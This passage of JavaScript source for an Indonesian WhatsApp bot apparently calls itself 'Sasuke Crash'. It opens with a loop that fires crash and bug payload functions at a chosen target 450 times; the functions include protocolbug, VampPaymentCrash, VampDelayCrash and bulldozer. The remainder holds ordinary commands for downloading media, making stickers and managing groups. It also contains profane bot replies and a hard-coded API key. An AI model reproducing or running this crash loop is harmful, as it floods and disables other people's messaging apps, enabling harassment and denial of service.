       for (let i = 0; i < 450; i++) {
       await protocolbug2(pepec, true);
       await protocolbug1(pepec, true);
       await protocolbug2(pepec, true);
       await protocolbug3(pepec, true);
       await protocolbug4(pepec, true);
       await protocolbug5v2(pepec, true);
       await protocolbug5v2(pepec, true);
       await protocolbug5v2(pepec, true);
       await protocolbug5v2(pepec, false);
       await protocolbug5v2(pepec, false);
       await protocolbug5(pepec, true);
       await protocolbug5(pepec, true);
       await protocolbug5(pepec, true);
       await protocolbug5(pepec, true);
       await protocolbug5(pepec, false);
       await protocolbug5(pepec, false);
       await protocolbug5(pepec, false);
       await protocolbug5(pepec, false);
       await VampPaymentCrash(pepec, true);
       await VampDelayMess(langgxyz, pepec);
       await VampPrivateBlank(langgxyz, pepec);
       await VampDelayCrash(langgxyz, pepec);
       await VampBroadcast(langgxyz, pepec, true);
       await mentionSw(pepec);
       await carouselNew(pepec)
       await bulldozer(pepec)
       await carouselNew(pepec)
       await bulldozer(pepec)
       await DelayStc(langgxyz, pepec)
       await DelayStc(langgxyz, pepec)
       await carouselNew(pepec)
       await bulldozer(pepec)
       await carouselNew(pepec)
       await bulldozer(pepec)
       await DelayStc(langgxyz, pepec)
       await DelayStc(langgxyz, pepec)       
    }       
}
break
case "h":
            case "hidetag": {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                if (!isAdmins && !isCreator) return Reply(mess.admin)
 if (!q) return Reply(`Teks nya mana dongo`);
                if (m.quoted) {
                    langgxyz.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    langgxyz.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m })
                }
            }
            break
                
                case 'debug': {
	if (!isCreator) return ErlanggaReply(mess.owner)
	if (!m.quoted) return ErlanggaReply('Reply Message!')
	await SasukeDebug(quoted);
	}
	break
	case 'play': {
  langgxyz.sendMessage(m.chat, { react: { text: "💬", key: m.key } });
    if (args.length === 0) return langgxyz.sendMessage(m.chat, { text: `🎶 Ketikkan nama lagu atau URL YouTube, misalnya:\n${prefix+command} dj kane` }, { quoted: m });
    
    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0) return langgxyz.sendMessage(m.chat, { text: '🔍 Lagu yang Anda cari tidak ditemukan. Silakan coba lagi dengan kata kunci yang lebih tepat.' }, { quoted: m });

        const video = search.all[0];
        const detail = `🎥 *Youtube Audio Play*

* Judul* : ${video.title}
* Penonton* : ${video.views}
* Pengarang* : ${video.author.name}
* Diunggah* : ${video.ago}
* URL* : ${video.url}

🔄 _Proses pengunduhan audio, harap tunggu..._`;

        await langgxyz.sendMessage(m.chat, { text: detail }, { quoted: PayX });

        const format = 'mp3';
        const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(video.url)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;

        const response = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        if (!response.data || !response.data.success) return langgxyz.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: PayX });

        const { id, title, info } = response.data;
        const { image } = info;

        while (true) {
            const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            if (progress.data && progress.data.success && progress.data.progress === 1000) {
                const downloadUrl = progress.data.download_url;

                await langgxyz.sendMessage(m.chat, {
                    audio: { url: downloadUrl },
                    mimetype: 'audio/mpeg',
                    fileName: `${title}.mp3`
                }, { quoted: PayX });

                await langgxyz.sendMessage(m.chat, {
                    text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
                }, { quoted: PayX });
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } catch (error) {
        console.error('Error:', error);
        langgxyz.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: PayX });
    }
}
break;	
case "brat": {
          if (!text) return Reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix+command} halo suki`) 
                                               try {
                                                       await langgxyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Erlangga Official",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await langgxyz.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await langgxyz.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }
                                                                                          break 
                                                                                           case "bratvid": {
          if (!text) return m.reply(`*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix+command} halo suki`) 
                                               try {
                                                       await langgxyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                                                               const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true`;
                                                                       const response = await axios.get(url, { responseType: "arraybuffer" });
                                                                               const sticker = new Sticker(response.data, {
                                                                                           pack: "Stiker By",
                                                                                                       author: "Erlangga Developer",
                                                                                                                   type: "image/png",
                                                                                                                           });
                                                                                                                                   const stikerBuffer = await sticker.toBuffer();
                                                                                                                                           await langgxyz.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
                                                                                                                                               } catch (err) {
                                                                                                                                                       console.error("Error:", err);
                                                                                                                                                               await langgxyz.sendMessage(m.chat, {
                                                                                                                                                                           text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
                                                                                                                                                                                   }, { quoted: m });
                                                                                                                                                                                       }
                                                                                                                                                                                      
                                                                                                                                                                                      }                                                                                   
break
case 'sticker':
case 's':
case 'stiker': {
    if (!quoted) return ErlanggaReply(`reply image/video dengan caption ${prefix + command}`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, langgxyz, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return m.reply('Durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(videoUrl, langgxyz, m);
            } else {
                return ErlanggaReply('Kirim gambar/video dengan caption .s (video durasi 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return ErlanggaReply('Terjadi kesalahan saat memproses media. Coba lagi.');
        }
    }
    break;
            case "tourl": {
if (!/image/.test(mime)) return Reply(example("𝗥𝗲𝗽𝗹𝘆/𝗞𝗶𝗿𝗶𝗺 𝗙𝗼𝘁𝗼"))
let media = await langgxyz.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Erlangga.png');

let teks = directLink.toString()
await langgxyz.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break
case "tt": case "tiktok": {
if (!text) return Reply(example("url"))
if (!text.startsWith("https://")) return Reply(example("url"))
await tiktokDl(q).then(async (result) => {
await langgxyz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: langgxyz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await langgxyz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await langgxyz.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await langgxyz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break              
						 
                 case "pin":
      case "pinterest":
        {
          async function pinterest(query) {
            try {
              const { data } = await axios.get(
                `https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(
                  query
                )}`
              );

              return data.result[
                Math.floor(Math.random() * data.result.length)
              ];
            } catch (err) {
              throw Error(err.message);
            }
          }

          if (!text) return Reply(`Contoh: .sasuke`);
          try {
            let hasil = await pinterest(text);
            if (!hasil) return Reply("Gambar tidak ditemukan.");
            const buttons = [
              {
                buttonId: `${prefix}pin ${command}`,
                buttonText: {
                  displayText: "Next",
                },
                type: 1,
              },
            ];

            await langgxyz.sendMessage(
              m.chat,
              {
                image: { url: hasil },
                caption:
                  "Lanjut mencari gambar yang sama? Klik tombol *Next* dibawah ini",
                footer: `Search By Sasuke Crash`,
                buttons: buttons,
                headerType: 1,
                viewOnce: true,
              },
              { quoted: PayX }
            );
          } catch (err) {
            console.error(err.message);
            Reply("Terjadi kesalahan");
          }
        }
        break;
        case "qc": {

if (!text) return ErlanggaReply('teksnya')
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
ErlanggaReply("Tunggu Sebentar....")
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return Reply("Error")
await langgxyz.sendImageAsSticker(m.chat, tempnya, m, {packname: global.packname})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break
case 'tohd': case "hd": case 'remini': {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await langgxyz.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await langgxyz.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break
                case "clsesi": case "clearsession": {
 if (!isCreator) return ErlanggaReply(mess.owmer)
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./assest/tmp/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./assest/tmp/sampah/" + u)
}
ErlanggaReply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break
                case 'qc2': {
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else ErlanggaReply("Input teks atau m?.reply teks yang ingin di jadikan quote!")
if (!text) return ErlanggaReply('masukan text')
if (text.length > 30) return ErlanggaReply('Maksimal 30 Teks!')
ErlanggaReply("Tunggu Sebentarr...")
let ppnyauser = await await langgxyz.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
langgxyz.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
                case 'tiktoks':
case 'ttsearch': {
if (args.length == 0) return Reply(`Example: ${prefix + command} sad vibes malam`)
ErlanggaReply("Tunggu Sebentarr Ya Suu!!")
let res = await fetchJson(`https://www.putz.my.id/api/download?type=tiktoks&q=${args[0]}`)
langgxyz.sendMessage(m?.chat, { video: { url: res.result.nowatermark_hd }, caption: res.result.title, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
langgxyz.sendMessage(m?.chat, { audio: { url: res.result.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break;	                
case 'antilink': {
                if (!m.isGroup) return ErlanggaReply("Dongoo, Khusus Dalam Group")
                if (!isAdmins && !isCreator) return ErlanggaReply("Untuk Admin Doang Kocakk!!")
                if (!isBotAdmins) return ErlanggaReply("Lah Kocak Bot Bukan Admin Memek")
                if (!text) return reply(`silakan pilih opsinya, on/off, contoh ${prefix + command} on/off`)
                if (args[0] === "on") {
                    if (global.db.data.chats[m.chat].antilink) return ErlanggaReply(`udaaa aktif`)
                    global.db.data.chats[m.chat].antilink = true
                    ErlanggaReply('successfully activate antilink in this group')
                } else if (args[0] === "off") {
                    if (!global.db.data[m.chat].antilink) return ErlanggaReply(`udah nonaktif`)
                    global.db.data[m.chat].antilink = false
                    ErlanggaReply('successfully disabling antilink in this group')
                }
            }
                break;
                 case 'promote':
            case 'pm': {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                if (!isCreator && !isAdmins) return ErlanggaReply(mess.admin)
                if (!isBotAdmins) return ErlanggaReply(mess.botadmin)
                if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return ErlanggaReply('tag/ErlanggaReply pesan target yang ingin di jadikan admin!')
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (!m.mentionedJid[0] && !m.quoted && !text) return ErlanggaReply(`tag/ErlanggaReply target yang mau di ${command}`)
                await reaction(m.chat, "✅")
                await langgxyz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => ErlanggaReply('sukses promote member')).catch((err) => ErlanggaReply('terjadi kesalahan'))
            }
                break

            case 'demote':
            case 'dm': {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                if (!isCreator && !isAdmins) return ErlanggaReply(mess.admin)
                if (!isBotAdmins) return ErlanggaReply(mess.botadmin)
                if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('tag/ErlanggaReply pesan target yang ingin di un admin!')
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`tag/ErlanggaReply target yang mau di ${command}`)
                await reaction(m.chat, "⚡")
                await langgxyz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => ErlanggaReply('sukses demote admin')).catch((err) => ErlanggaReply('terjadi kesalahan'))
            }
                break
                case 'peler':
            case 'anj':
            case 'memek':
            case 'mmk':
            case 'ajg':
            case 'annjingg':
            case 'kntl':
            case 'puki':
            case 'yatim':
            case 'ytim':
            case 'bangsat':
            case 'kontol':
            case 'stress':
            case 'kimak': {
                ErlanggaReply(`lu juga ${command}😂`)
            }
                break
                case 'open':
            case 'buka': {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                if (!isAdmins && !isCreator) return ErlanggaReply(mess.admin)
                if (!isBotAdmins) return m.tolak(mess.botadmin)
                langgxyz.groupSettingUpdate(m.chat, 'not_announcement')
                ErlanggaReply(`sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
            }
                break

            case 'close':
            case 'tutup': {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                if (!isAdmins && !isCreator) return ErlanggaReply(mess.admin)
                if (!isBotAdmins) return m.tolak(mess.botadmin)
                langgxyz.groupSettingUpdate(m.chat, 'announcement')
                ErlanggaReply(`sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
            }
                break

            case 'totag': {
                if (!isAdmins) return ErlanggaReply(mess.admin);
                if (!m.isGroup) return ErlanggaReply(mess.group);
                if (!m.quoted) return ErlanggaReply(`ErlanggaReply pesan dengan caption ${prefix + command}`);
                const groupMetadata = await langgxyz.groupMetadata(m.chat);
                const participants = groupMetadata.participants;

                langgxyz.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map((a) => a.id)
                }, { quoted: m });
            }
                break
                case "kick":
            case "kik":
            case "dor": {
                if (!m?.isGroup) return ErlanggaReply(mess.group)
                if (!isAdmins) return ErlanggaReply(mess.admin)
                if (!isBotAdmins) return ErlanggaReply(mess.botadmin)
                if (!text && !m?.quoted) return ErlanggaReply(`siapa yang mau di kick njrr, contoh ErlanggaReply orang atau tag dengan caption ${prefix + command}`)
                let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await langgxyz.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
            }
                break
                case 'tagall': {
                if (!isAdmins) return ErlanggaReply(mess.admin);
                if (!m.isGroup) return ErlanggaReply(mess.group);

                const textMessage = args.join(" ") || "kosong";
                let teks = `pesan tagall :\n> *${textMessage}*\n\n`;

                const groupMetadata = await langgxyz.groupMetadata(m.chat);
                const participants = groupMetadata.participants;

                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                langgxyz.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: m });
            }
                break
                case 'cekkhodam': {
                if (!text) return ErlanggaReply(`ketik nama lu anjg, contoh ${prefix + command} rido`)
                let who
                if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
                const anunya = [
                    "Kaleng Cat Avian",
                    "Pipa Rucika",
                    "Botol Tupperware",
                    "Badut Mixue",
                    "Sabun GIV",
                    "Sandal Swallow",
                    "Jarjit",
                    "Ijat",
                    "Fizi",
                    "Mail",
                    "Ehsan",
                    "Upin",
                    "Ipin",
                    "sungut lele",
                    "Tok Dalang",
                    "Opah",
                    "Opet",
                    "Alul",
                    "Pak Vinsen",
                    "Maman Resing",
                    "Pak RT",
                    "Admin ETI",
                    "Bung Towel",
                    "Lumpia Basah",
                    "Martabak Manis",
                    "Baso Tahu",
                    "Tahu Gejrot",
                    "Dimsum",
                    "Seblak Ceker",
                    "Telor Gulung",
                    "Tahu Aci",
                    "Tempe Mendoan",
                    "Nasi Kucing",
                    "Kue Cubit",
                    "Tahu Sumedang",
                    "Nasi Uduk",
                    "Wedang Ronde",
                    "Kerupuk Udang",
                    "Cilok",
                    "Cilung",
                    "Kue Sus",
                    "Jasuke",
                    "Seblak Makaroni",
                    "Sate Padang",
                    "Sayur Asem",
                    "Kromboloni",
                    "Marmut Pink",
                    "Belalang Mullet",
                    "Kucing Oren",
                    "Lintah Terbang",
                    "Singa Paddle Pop",
                    "Macan Cisewu",
                    "Vario Mber",
                    "Beat Mber",
                    "Supra Geter",
                    "Oli Samping",
                    "Knalpot Racing",
                    "Jus Stroberi",
                    "Jus Alpukat",
                    "Alpukat Kocok",
                    "Es Kopyor",
                    "Es Jeruk",
                    "Cappucino Cincau",
                    "Jasjus Melon",
                    "Teajus Apel",
                    "Pop ice Mangga",
                    "Teajus Gulabatu",
                    "Air Selokan",
                    "Air Kobokan",
                    "TV Tabung",
                    "Keran Air",
                    "Tutup Panci",
                    "Kotak Amal",
                    "Tutup Termos",
                    "Tutup Botol",
                    "Kresek Item",
                    "Kepala Casan",
                    "Ban Serep",
                    "Kursi Lipat",
                    "Kursi Goyang",
                    "Kulit Pisang",
                    "Warung Madura",
                    "Gorong-gorong",
                ]
                function getRandomKhodam() {
                    const randomKhodam = Math.floor(Math.random() * anunya.length);
                    return anunya[randomKhodam];
                }
                const khodam = getRandomKhodam()
                const response = ` 
> *Nama :* ${text}
> *Khodam :* ${khodam}`
                ErlanggaReply(response)
            }
                break;


            case 'apakah': {
                if (!text) return ErlanggaReply(`apa njrr? contoh ${prefix + command} saya wibu`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                ErlanggaReply(`pertanyaan : apakah ${text}\njawaban : ${kah}`)
            }
                break

            case 'bisakah': {
                if (!text) return ErlanggaReply(`apaa njrr? contoh ${prefix + command} saya menjadi presiden`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!', 'naik anjing aja, naik anjing']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                ErlanggaReply(`pertanyaan : apakah ${text}\njawaban : ${ga}`)
            }
                break

            case 'bagaimanakah': {
                if (!text) return ErlanggaReply(`apaa njrr? contoh ${prefix + command} cara mengatasi sakit hati`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                ErlanggaReply(`pertanyaan : apakah ${text}\njawaban : ${ya}`)
            }
                break
                case 'jadian': {
                if (!m.isGroup) return ErlanggaReply(mess.group);
                langgxyz.jadian = langgxyz.jadian ? langgxyz.jadian : {};
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                if (!text) return ErlanggaReply(`Tag/ErlanggaReply seseorang, contoh:\n${prefix + command} @628888`)
                if (users === m.sender) return ErlanggaReply("njirr, stress!");
                if (users === botNumber) return ErlanggaReply("njirr, sama bot? edan 😂");

                if (!global.db.data.users[users]) global.db.data.users[users] = { pacar: null };
                if (!global.db.data.users[m.sender]) global.db.data.users[m.sender] = { pacar: null };

                let pasangan = global.db.data.users[users].pacar;
                let pasangan2 = global.db.data.users[m.sender].pacar;

                if (pasangan2 === users) {
                    ErlanggaReply(`itu kan pacar lu, njirr`);
                } else if (pasangan) {
                    ErlanggaReply(`udaa ada pacarnya njirr!\n\nwoii @${pasangan.split("@")[0]}, ayangmu mau diambil`);
                } else if (pasangan2) {
                    ErlanggaReply(`lakh, mau selingkuh?\n\nwoii @${pasangan2.split("@")[0]}, lihat nih, dia mau selingkuh`);
                } else {
                    let ktnmbk = [
                        "ada saat di mana aku nggak suka sendiri. tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.", "aku baru sadar ternyata selama ini kamu kaya! kaya yang aku cari selama ini. kamu mau nggak jadi pacarku?", "aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.", "aku boleh kirim cv ke kamu nggak? soalnya aku mau ngelamar jadi pacar.", "aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?", "aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. maukah kamu menerima cintaku?", "aku ingin bilang sesuatu. udah lama aku suka sama kamu, tapi aku nggak berani ngomong. jadi, kuputuskan untuk wa saja. aku pengin kamu jadi pacarku.", "aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. aku mencintaimu, maukah kamu menjadi pacarku?", "aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. maukah kau jadi pacarku?", "aku mau chat serius sama kamu. selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. kalau nggak keberatan, kamu mau jadi pacarku?", "aku melihatmu dan melihat sisa hidupku di depan mataku.", "aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.", "aku menyukaimu dari dulu. kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. akan sempurna jika kamu yang menjadi spesial di hati.", "aku naksir banget sama kamu. maukah kamu jadi milikku?", "aku nggak ada ngabarin kamu bukan karena aku nggak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. mungkin kamu akan kaget mendengarnya. selama ini aku menyukaimu.", "aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.", "aku nggak tahu sampai kapan usiaku berakhir. yang aku tahu, cintaku ini selamanya hanya untukmu.", "aku sangat menikmati waktu yang dihabiskan bersama hari ini. kita juga sudah lama saling mengenal. di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.", "aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. maukah kamu menjadi kekasihku?", "aku siapkan mental untuk hari ini. kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.", "aku tahu kita nggak seumur, tapi bolehkan aku seumur hidup sama kamu?", "aku tahu kita sudah lama sahabatan. tapi nggak salah kan kalau aku suka sama kamu? apa pun jawaban kamu aku terima. yang terpenting itu jujur dari hati aku yang terdalam.", "aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. jika kau mengerti akan kode ini maka kita akan bersama.", "aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.", "apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. karena berada di sampingmu, anugerah terindah bagiku. jadilah kekasihku, hey kamu.", "atas izin allah dan restu mama papa, kamu mau nggak jadi pacarku?", "bagaimana kalau kita jadi komplotan pencuri? aku mencuri hatimu dan kau mencuri hatiku.", "bahagia itu kalau aku dan kamu telah menjadi kita.", "besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. biar aku ada kerjaan buat selalu mikirin kamu.", "biarkan aku membuatmu bahagia selamanya. kamu hanya perlu melakukan satu hal: jatuh cinta denganku.", "biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!", "biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?", "bisakah kamu memberiku arahan ke hatimu? sepertinya aku telah kehilangan diriku di matamu.", "bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. dijawab ya.", "caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. aku mau kamu jadi milikku.", "cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.", "cintaku ke kamu tuh kayak angka 5 sampai 10. nggak ada duanya. aku mau kamu jadi satu-satunya wanita di hatiku.", "cowok mana yang berani-beraninya nyakitin kamu. sini aku obati, asal kamu mau jadi pacar aku.", "hai, kamu lagi ngapain? coba deh keluar rumah dan lihat bulan malam ini. cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?", "hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. senyummu menerangi hidupku dan semua kegelapan menghilang. maukah kamu menjadi milikku?", "ini bukan rayuan, tapi ini yang aku rasakan. aku ingin bertukar tulang denganmu. aku jadi tulang punggungmu, kamu jadi tulang rusukku. jadian yuk!", "ini cintaku, ambillah. ini jiwaku, gunakan itu. ini hatiku, jangan hancurkan. ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.", "izinkan aku mengatakan sesuatu yang menurutku sangat penting. hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. tetaplah di sana dan jadilah kekasihku. mau?", "jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. biarkan aku melakukannya sekarang.", "kalau aku matahari, kamu mau nggak jadi langitku? biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.", "kalau kamu membuka pesan ini, berarti kamu suka sama aku. kalau kamu membalas pesan ini, artinya kamu sayang sama aku. kalau kamu mengabaikan pesan ini, berarti kamu 